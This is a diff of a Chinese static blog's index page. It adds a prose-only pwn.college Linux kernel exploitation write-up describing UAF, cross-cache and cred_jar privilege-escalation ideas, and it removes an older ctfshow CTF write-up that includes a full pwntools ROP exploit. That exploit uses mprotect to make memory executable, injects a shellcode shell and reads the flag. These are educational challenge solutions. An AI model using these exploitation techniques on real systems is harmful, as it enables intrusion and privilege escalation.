@@ -153,6 +153,107 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/21/pwncollege-ker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="NazrinDuck">
+      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog de Назриндак">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/05/21/pwncollege-ker/" class="post-title-link" itemprop="url">[pwn.college] Kernel Exploitation 解题记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-05-21 00:43:05 / Modified: 01:40:27" itemprop="dateCreated datePublished" datetime="2025-05-21T00:43:05+08:00">2025-05-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h2><p>之前总算入门了Linux Kernel Pwn,想着找几个题练练手，<del>注意到</del>pwn.college里边有这样一个专题，于是就给它AK了</p>
+<blockquote>
+<p>其实也就两三天的时间</p>
+</blockquote>
+<p><img src="/images/pwncollege-ker/winner.jpg" alt=":)"></p>
+<blockquote>
+<p>注：本人所有利用手法均为非预期(?)，正常解法还是得看视频复现</p>
+<blockquote>
+<p>不得不感叹漏洞利用技术发展之迅速，拿最新的利用手法打这种传统UAF简直降维打击</p>
+</blockquote>
+</blockquote>
+<p>保密一下就不放Exp了，只说一下大概思路</p>
+<blockquote>
+<p>所有Linux版本均为<strong>v6.7.9</strong></p>
+</blockquote>
+<h2 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h2><p>刚开始吓我一跳，自己用<code>kmem_cache_creat</code>造了一个slab，还以为要cross cache attack<del>（记着待会要用）</del><br>仔细一分析，发现是一种最简单的UAF,很长的越界写&#x2F;读，大小为kmalloc-512（如果是kmalloc分配的话），而且获取flag不用提权，它直接读到一个堆块里边了。<br>简单审计发现好像可以堆喷该文件（&#x2F;proc&#x2F;kheap），尝试发现确实可以，直接堆喷（其实两个就够了）文件，通过越界读读取相邻存放flag堆块里边的flag</p>
+<blockquote>
+<p>独立slab的好处就是你能比较清楚得把控堆块排列与个数，因为一般只有该模块使用不会有其他的资源抢夺，但肯定比不上用户态heap的精准把握</p>
+</blockquote>
+<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><p>依旧是独立slab,这一次没有后门flag了，需要提权。<br>分析发现很长的越界写&#x2F;读直接cross-cache overflow即可，给了一个函数调用我还真不大清楚怎么用（）</p>
+<p>通过pgv堆喷order-1的pages,先free第一个页，堆喷文件&#x2F;proc&#x2F;kheap占用，再free第二个页，堆喷cred_jar占用，通过越界写直接改cred_jar，成功率很高</p>
+<blockquote>
+<p>堆喷cred_jar用<code>setuid(1000)</code>即可，但要注意数量。由于远程是比较接近实际环境的可能要多喷射一些，本地可以少一点</p>
+</blockquote>
+<h2 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h2><p>依旧是独立slab,这一次没有越界读写了，这就需要cross-cache attack了。<br>其余功能还是一样，漏洞只有UAF了</p>
+<p>通过构造特定数量的堆结构，并free特定堆块来填充满freelist，这样在遇到empty slab时，会调用<code>__slab_free</code>将其释放，从而得到一个page UAF原语</p>
+<p>利用思路还是堆喷cred_jar并用page UAF修改，成功率很高</p>
+<h2 id="challenge4-5"><a href="#challenge4-5" class="headerlink" title="challenge4 ~ 5"></a>challenge4 ~ 5</h2><blockquote>
+<p>本来想好好做一下，但是不会by pass kaslr,看了PPT才知道要通过oops获取内核信息（这就是为什么很多内核题都会有panic_on_oops的设定）</p>
+</blockquote>
+<p>challenge4多了kaslr，不影响任何步骤，利用同challenge3<br>challenge5看都没看直接打的，貌似是少了奇怪的函数调用，但我本身就不知道怎么利用（）</p>
+<h2 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h2><p>不是独立slab了，申请的堆块全都来自kmalloc-512，漏洞依旧是UAF，但是没有了读取功能，不过给了后门flag</p>
+<blockquote>
+<p>读都不用读，闭着眼睛往里写就行，只需一个字节</p>
+</blockquote>
+<p>有请<code>pipe_buffer</code>上场，给大家来点小小的page UAF震撼</p>
+<p>甚至不用堆喷cred_jar，直接堆喷flag即可（flag写入了一份kmalloc-512，多喷一点很容易取走UAF page的），用pipe读取</p>
+<h2 id="challenge7-8"><a href="#challenge7-8" class="headerlink" title="challenge7 ~ 8"></a>challenge7 ~ 8</h2><p>challenge7和challenge6功能和漏洞都一样，就是没有了后门flag，依然page UAF堆喷cred_jar，UAF改写即可，成功率挺高的</p>
+<p>challenge8好像在<code>copy_from_user</code>之前加了一个检验<code>__check_object_size</code>，然而page UAF才不管这些:)，利用手法同上</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>只能说太伟大了page UAF &amp; cross cache，这种利用手法过于震撼了，完完全全是通杀</p>
+</blockquote>
+<p>新方法没学到几个，只是练习了一下老方法，有空还得看一下提供的资料PPT和视频。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/21/languages/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1431,130 +1532,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/21/writeup3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="NazrinDuck">
-      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog de Назриндак">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/02/21/writeup3/" class="post-title-link" itemprop="url">[ctfshow] pwn 内部赛 flower write up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-02-21 00:48:11" itemprop="dateCreated datePublished" datetime="2024-02-21T00:48:11+08:00">2024-02-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-09-19 00:12:10" itemprop="dateModified" datetime="2024-09-19T00:12:10+08:00">2024-09-19</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>今天做了一下午的比较复杂的题，写一下wp，不能保证没有错误，欢迎大家指出</p>
-<p>拿到题目后一开始还没意识到是花指令混淆反汇编，用pwndbg调试了很长时间，问了群里的大佬才意识到这点，事实上flower已经暗示了这个为花指令混淆；</p>
-<p>首先file和checksec一下：</p>
-<p><img src="https://pic1.zhimg.com/80/v2-09a300ef6745694274091fd3d2eed160_1440w.webp" alt="file"></p>
-<p><img src="https://pic3.zhimg.com/80/v2-c05f5e0e63fbb1e23244bfe06c6d87fe_1440w.webp" alt="checksec"></p>
-<p>发现是一个静态编译的64位程序，而且开了NX堆栈不可执行；</p>
-<p>静态编译程序无动态链接库，ret2libc是行不通的，考虑写入shellcode后ret2shellcode；</p>
-<p>拖进ida64， 发现ida64逆向出来了一堆看不懂的奇怪函数，而且无法找到main函数：</p>
-<p><img src="https://pic1.zhimg.com/80/v2-dabbaed7fc1941c0bd3d7c8211a7bde8_1440w.webp"></p>
-<p>问了问群里的大佬，说是这个不是main函数，先运行一下看看：</p>
-<p><img src="https://pic1.zhimg.com/80/v2-4753524a105f521701e3df62e2c9fc50_1440w.webp"></p>
-<p>直接运行看上去很正常，去ida里找字符串：</p>
-<p><img src="https://pic3.zhimg.com/80/v2-ce3968b8a0811c90f53eb147d1d9a722_1440w.webp"></p>
-<p>根据字符串找交叉引用，发现了没有被反汇编的main函数：</p>
-<p><img src="https://pic1.zhimg.com/80/v2-96325811abb969183a2fc2beec97f594_1440w.webp" alt="ctrl+x交叉引用"></p>
-<p>这里被标红说明有问题，注意这里的jz和jnz：</p>
-<p><img src="https://pic4.zhimg.com/80/v2-b3922739d1d49221fd164db92d5a49eb_1440w.webp"></p>
-<p>jz和jnz指向了同一个地址，说明无论ZF是何值都会跳转，且夹在中间的指令为死指令，不会被执行，</p>
-<p>我们把这两个地址之间的指令全改成0x90(nop)：</p>
-<p><img src="https://pic4.zhimg.com/80/v2-def6883a3fa4899cdd80b2daa615c77b_1440w.webp"></p>
-<p>去main上按p重新生成函数：</p>
-<p><img src="https://pic3.zhimg.com/80/v2-e10fb60b76f6691a98c39995130b36fa_1440w.webp"></p>
-<p>发现还有一段没有接上；</p>
-<p>这时删除下边那个400A30函数，把main的结束地址放到400A74：</p>
-<p><img src="https://pic1.zhimg.com/80/v2-a7c21d420dd1aba4eb4544c5a730ee9c_1440w.webp"></p>
-<p><img src="https://pic4.zhimg.com/80/v2-e7631db945d64202ca1da38f279ad523_1440w.webp"></p>
-<p>成功合并拿到真正的main函数：</p>
-<p><img src="https://pic3.zhimg.com/80/v2-807d1ad68b3e21034197a4b67ce3a06a_1440w.webp" alt="main"></p>
-<p>这样就能够接着正常分析了。</p>
-<p>先看输入：第一个scanf接受一个%d整数，没有什么溢出点，不过程序限制了v9的大小不能超过10；而下一个read会将读入v9个数据，程序想通过这种方式限制输入量。</p>
-<p>事实上，注意v9(unsigned int)和(int)的类型转换，我们可以随便输入负数来绕过检查来几乎无限制地读取数据；</p>
-<p>所以第一步：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;-22&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>接下来尝试栈溢出。前文提到过ret2shellcode，我们先寻找一下可读可写可执行的地址：</p>
-<p><img src="https://pic2.zhimg.com/80/v2-9382ac7c968722b940cd14bba21b2c29_1440w.webp" alt="pwndbg下vmmap"></p>
-<p>发现没有合适的段，这时寻找能改变权限的函数mprotect：</p>
-<p><img src="https://pic2.zhimg.com/80/v2-fcfdb09b8c159f6b1627070cf66e9dd9_1440w.webp" alt="mprotect"></p>
-<p>该函数的应用在网上<a target="_blank" rel="noopener" href="https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect#li-ti">查了查</a>，需要三个参数，ROPgadget一下发现pop rdi，rsi，rdx都能找到：</p>
-<p><img src="https://pic4.zhimg.com/80/v2-b7e78b3b44ecef95607b6e15c008b633_1440w.webp" alt="rdi"></p>
-<p><img src="https://pic2.zhimg.com/80/v2-339f72fefd8bd09dec5e3782545b1ea5_1440w.webp" alt="rsi"></p>
-<p><img src="https://pic2.zhimg.com/80/v2-67d3ec6178e751b66b3018083172d67d_1440w.webp" alt="rdx"></p>
-<p>v8在栈上有0x50个空间，接下来开始构造payload的第一部分：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x1024</span>)</span><br><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x7</span>)</span><br><span class="line">payload += p64(mprotectPlt)</span><br></pre></td></tr></table></figure>
-
-<p>我们计划向0x400000段写入shellcode，因此选择了修改该地址的权限</p>
-<p>接下来拿read函数向该段写入shellcode：</p>
-<p><img src="https://pic4.zhimg.com/80/v2-d3c6d82309f9c2cff4f78098cde77063_1440w.webp" alt="read"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(readPlt)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
-
-<p>由于能够读入很长的字段，我们直接接着构造payload的第二部分，最后返回地址写成0x400000；</p>
-<p>接下来输入shellcode：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure>
-
-<p>远程试一下（有时会收到EOFerror，再试一次就行），成功拿到flag：</p>
-<p><img src="https://pic2.zhimg.com/80/v2-f83c54a3bb14cad295ec797f4c66940d_1440w.webp" alt="final"></p>
-<p>还有一种做法是通过ROPgadget内置的ropchain来自动生成getshell脚本(一般最终是通过syscall执行execve(“&#x2F;bin&#x2F;sh”, 0, 0))，用法就是–ropchain，这里就不再赘述了。</p>
-<p>静态编译的弱点就是会一股脑地编译大量函数，各种gadgets非常好寻找，构造rophchain的方法非常灵活，这只是一个例子。</p>
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../flower&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">port = <span class="number">28248</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#===============plt &amp; got===============#</span></span><br><span class="line">readPlt = <span class="number">0x43f9d0</span></span><br><span class="line">mprotectPlt = <span class="number">0x440520</span></span><br><span class="line">rdiAddr = <span class="number">0x0000000000401696</span></span><br><span class="line"><span class="comment">#pop rdi;ret</span></span><br><span class="line">rsiAddr = <span class="number">0x00000000004017b7</span></span><br><span class="line">rdxAddr = <span class="number">0x0000000000442e46</span></span><br><span class="line"><span class="comment">#===============shellcode===============#</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#=================start=================#</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;-22&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(rdiAddr</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x1024</span>)</span><br><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x7</span>)</span><br><span class="line">payload += p64(mprotectPlt)</span><br><span class="line"></span><br><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(readPlt)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1624,7 +1601,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
